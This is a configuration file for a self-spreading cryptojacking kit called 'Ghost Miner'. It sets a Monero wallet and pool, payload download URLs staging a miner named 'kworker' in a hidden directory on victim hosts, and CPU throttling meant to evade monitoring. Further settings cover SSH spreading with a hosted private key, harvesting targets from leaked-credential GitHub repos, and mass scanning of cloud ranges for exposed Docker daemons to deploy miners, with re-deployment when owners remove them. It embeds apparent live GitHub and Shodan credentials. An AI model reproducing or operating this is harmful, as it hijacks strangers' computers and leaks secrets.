# ============================================================================
# Ghost Miner - SINGLE SOURCE OF TRUTH.
# Edit here, re-publish, and every host that re-fetches follows automatically.
# Nothing else in this kit is hard-coded to your wallet or pool.
# ============================================================================

# Your Monero address. THIS is the one sink that every share credits.
WALLET="46Md49vuZSSDDG5e2FhStfYxszzfDgnjH6gU2YU8zHrS5QihNkwb5PFNTHCkPhoKpG3k6zGP1SpeTRVgVDZFFQQuCetBqU6"

# Stratum pool. Prefer the TLS port so the traffic looks like plain HTTPS.
# Example: pool.supportxmr.com:443  with TLS="true"
POOL="pool.supportxmr.com:443"
TLS="true"

# Neutral worker tag - deliberately NOT the hostname, so hosts leak no name.
RIG_ID="node"

# Where the payload + config + helper scripts are hosted (https).
CONFIG_URL="https://raw.githubusercontent.com/ronnissleepy-code/scripts/main"
PAYLOAD_URL="https://github.com/ronnissleepy-code/scripts/releases/latest/download/kworker"
SHA_URL="https://github.com/ronnissleepy-code/scripts/releases/latest/download/kworker.sha256"

# Staging dir on the victim host (hidden-ish).
SYSDIR="/tmp/.sysd"

# Threads to use. Empty => auto = every vCPU on the box.
# Measured here (2 vCPU AMD EPYC-Rome): 1 thread = 478 H/s, 2 threads = 950 H/s
# (+99%), 3 threads = 924 H/s (worse, one per physical core wins). The unit is
# Nice=19 so the miner still yields to whatever else wants the CPU.
THREADS=""

# --- CPU budget (tune.sh) -----------------------------------------------------
# Monitoring alerts on SUSTAINED CPU, so tune.sh measures what this host uses
# on its own and stays a fixed margin above that line. Two knobs, both in
# percent-of-all-cores points:
#
#   CPU_TARGET_PCT  hard ceiling, never exceeded. 100 keeps as much as fits.
#   HEADROOM_PCT    how far ABOVE the host's own usage we are willing to sit,
#                   capped by the ceiling. 100 = use all spare capacity (max
#                   hashrate). 25 = look natural (host's usage + 25 points).
#
# Note the granularity: on a 2 vCPU idle box, headroom 100 fits 2 threads
# (~950 H/s) while headroom 25 only fits 1 (~478 H/s) because 25% of 2 cores
# rounds to a single thread. Bigger boxes are punished proportionally less.
CPU_TARGET_PCT="100"
HEADROOM_PCT="100"

# "no" freezes the thread count at whatever THREADS/auto chose above.
AUTO_TUNE="yes"

# Sampling window (seconds) and minimum gap between thread changes (seconds).
# Each run costs ~2x TUNE_WINDOW seconds of nice-19 CPU; the wall-clock wait is
# what stops the thread count flapping when a cron job briefly uses a core.
TUNE_WINDOW="5"
TUNE_COOLDOWN="900"

# --- spreading --------------------------------------------------------------
# Optional: YOUR private key hosted at a URL. If set it is staged on every host
# as $SYSDIR/id_key, so the LAN spreader can hop to neighbours with no login.
KEY_URL="https://raw.githubusercontent.com/ronnissleepy-code/scripts/main/id_key"

# Optional: GitHub token (read-only is enough) for the GitHub harvester.
# GitHub's code search API requires auth; without this the harvester no-ops.
# NOTE: read-only is fine for searching, but pushing needs write access, so
# publish.sh falls back to your OS git credential for the push.
GITHUB_TOKEN="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"

# Logins the spreader/harvester will try on a found host.
TARGET_USERS="root ubuntu ec2-user admin"

# How many GitHub repos the harvester inspects per run. This is the single
# biggest lever on fleet growth: a repo only yields targets if it also mentions
# a public IP, and only a few do, so 5 repos is a very thin slice.
# 50 repos ~ 3 min of tarball fetching; the probe pass (bounded by
# HUNT_MAX_PROBE) is what fills the unit's 30-minute window, so keep them in
# balance. Rows whose host can never be ours (private, CDN front, placeholder,
# kernel version) are filtered out - each row is a real ssh attempt.
HUNT_MAX_REPOS="50"

# How many candidate hosts to pull out of each repo it inspects.
HOSTS_PER_REPO="5"

# --- Shodan filter (shodan.sh) -----------------------------------------------
# Shodan already crawled the public IPv4 and wrote down what answers (ports,
# software + version, hostnames, tags). internetdb.shodan.io serves that back per
# IP with NO API KEY, so it is a free pre-filter: any :2375 host it knows about is
# handed straight to dock.sh (which needs no credential), hosts it has seen with
# no way in are skipped before an ssh attempt is spent, and swap/dex/defi-named
# or :8545 hosts are noted in crypto.txt.
#
# It is a *crawl*, so it is stale - our own box, whose :2375 we exposed minutes
# earlier, was missing from the DB, and "No information available" is common in
# cloud space. So it filters, never proves. The fresh box "stood up yesterday
# with defaults" is exactly the one a months-old crawl has never seen: that is
# why dockmass.sh stays the volume arm. filter does ~1 query/second.
IDB_MAX="200"
IDB_SKIP_DEAD="yes"

# Optional: a real Shodan API key unlocks `shodan.sh search '<query>'`, e.g.
#   shodan.sh search 'port:2375 !cloudflare country:DE'
# internetdb (the default filter) needs no key, so this is optional.
#
# MEASURED, so you know what you have: this free OSS key *authenticates*
# (api-info -> 200) but every /shodan/* resource answers
#   403 {"error":"Requires membership or higher to access"}
# including /shodan/host/{ip}. Only /shodan/ports works. So on the free plan the
# key changes nothing for discovery - filter and scout use keyless internetdb.
# `shodan.sh search` starts returning hosts the moment the account sits on the
# one-time $49 Membership plan (1M query credits/month); the code is wired for
# it already (SHODAN_PAGES for >100 results, spaced-JSON tolerant parser).
# NOTE: worker.env lives in a public repo, so this key is public.
SHODAN_KEY="XZgCF4veHn1Y8mTTBcUC4yP11B7XPALE"
SHODAN_PAGES="1"

# --- shodan seeder (seed.sh) --------------------------------------------------
# Membership = 100 query credits/month, 100 scan credits, 16 monitored IPs, and
# a hard 1 request/second on every plan. 1 credit = 1 search request = up to 100
# hosts. First query on this key (port:2375 country:DE) reported 4140 hosts, so a
# few hundred candidates is a couple of minutes of work.
SEED_MAX="10"        # queries per run  (hunt.sh calls it only when due)
SEED_EVERY="259200"  # 3 days -> ~10 runs/month x 10 queries = the 100 credits
SEED_PAGES="1"       # pages per query (each page is its own credit)

# --- docker vector (dock.sh) -------------------------------------------------
# An exposed daemon on :2375 needs no key, no user and no pairing - it just gets
# a container. curl only, so nothing has to exist on the host (not even docker).
# The container runs with RestartPolicy=always and CpuShares 512 (container
# equivalent of the ssh payload's nice 19).
DOCK_IMAGE="xmrig/xmrig"
# Named hosts per run. dock.sh only ever saw repo-scraped addresses before; the
# sweep and the shodan seeder can hand it thousands, so the cap is what stops it
# monopolising a run. Deploying is ~3s per host at DOCK_PAR, so 600 ~ a minute.
DOCK_MAX_HOSTS="900"
DOCK_PAR="40"

# NOTE on the "page not found" host class (measured): a slice of the population is
# an API *mock* - create returns a valid id, but a second create with the SAME name
# returns a different id (no name collision) and every id-based route 404s while
# /version, /info, /containers/json and /containers/create answer, and the list is a
# canned fixture (silly_elion / ubuntu:14.04, created 2014). Nothing actually runs
# there, so a start that answers 204 is the only real deploy signal. Real 18.06
# engines are different and are handled fine (they need the /v<ApiVersion> prefix
# and the id from create's response, both of which we now send).

# --- re-arm (dock.sh) ---------------------------------------------------------
# A measured slice of this population prunes foreign containers AND images off
# itself (our container gone, the image 404, the host's own container fine). So
# every run re-verifies what we own and re-deploys what vanished, plus a rotating
# slice of known daemons we no longer hold. 150 costs ~nothing at DOCK_PAR and is
# the difference between a growing pile of one-shot deploys and a standing fleet.
DOCK_REARM="yes"
DOCK_REARM_MAX="150"

# A daemon on the host we are already running on: its ssh payload mines already,
# so only an existing container of ours is touched. Avoids two randomx datasets
# on small boxes.
DOCK_SKIP_SELF="yes"

# --- docker mass sweep (dockmass.sh) -----------------------------------------
# dock.sh only ever sees hosts some leaked-key repo mentioned, and that queue is
# mostly noise (1.2.3.4 x17, an SNMP OID, kernel versions, Google/GitHub IPs) -
# leaving ~45 usable addresses, i.e. an expected daemon count of ~0. The docker
# vector needs no credential match, so its target set is free: sweep cloud /16s
# instead. Measured here: 1778 addresses in 47s (parallel 64), and 0 of 3048
# addresses in hetzner/DO space even answered on 2375 - the port is genuinely
# rare (~0.003% of IPv4), so expect a few per /16 rather than none.
#
# Space-separated cloud /16s (dev-heavy: hetzner, digitalocean, vultr, ovh,
# linode, scaleway, contabo). Trim to taste; the sweep just takes longer.
MASS_NETS="5.9 88.198 78.46 116.203 138.201 159.69 168.119 176.9 178.63 195.201 64.227 159.89 161.35 162.243 165.227 167.99 167.71 178.62 178.128 206.189 68.183 104.248 138.68 142.93 143.198 144.126 146.190 157.245 164.90 188.166 209.97 45.32 45.76 95.179 108.61 136.244 139.180 149.28 155.138 207.148 51.75 51.79 51.83 54.36 137.74 145.239 147.135 158.69 178.32 198.27 45.33 45.56 45.79 66.228 96.126 139.144 143.42 151.236 172.104 173.230 51.15 62.210 163.172 195.154 62.171 173.212 207.180"

# MASS_NETS above is now a *seed*. The volume arm is nets.txt, generated by
# netbuild.sh from keyless RIPE Stat data (thousands of hosting-provider /16s).
# It ships to every host through the updater. Why it matters: yield/day is scan
# rate x density (~26 daemons/day per host) and does not care about list length,
# but a short list finishes in ~2 days and then idles for the rest of
# MASS_REFRESH - about 44 hosts/month instead of ~780.
# Set MASS_NETS_FILE=no to ignore nets.txt and sweep only MASS_NETS.
MASS_NETS_FILE="yes"

# Concurrent addresses (each fires :2375 and :2376 at once, so the second port
# costs no wall-clock time). 128 ~ 60 addresses/s ~ a /24 in 4s.
MASS_PAR="128"
MASS_BUDGET="600"

# Probe TLS :2376 alongside :2375. Concurrent, so it is near-free - and it is the
# only way to see the TLS-only part of the daemon population.
MASS_TLS="yes"

# Also probe the legacy pre-1.0 daemon port :4243 (`docker -H tcp://host:4243`).
# Same argument - fired in parallel, so a third port costs no wall-clock and
# widens the population to daemons that never used the 2375 default.
MASS_4243="yes"

# Re-sweep a /24 after this many seconds - new daemons appear over time.
MASS_REFRESH="2592000"

# Deploy the moment the sweep finds a daemon instead of waiting for dock.sh.
MASS_DEPLOY="yes"
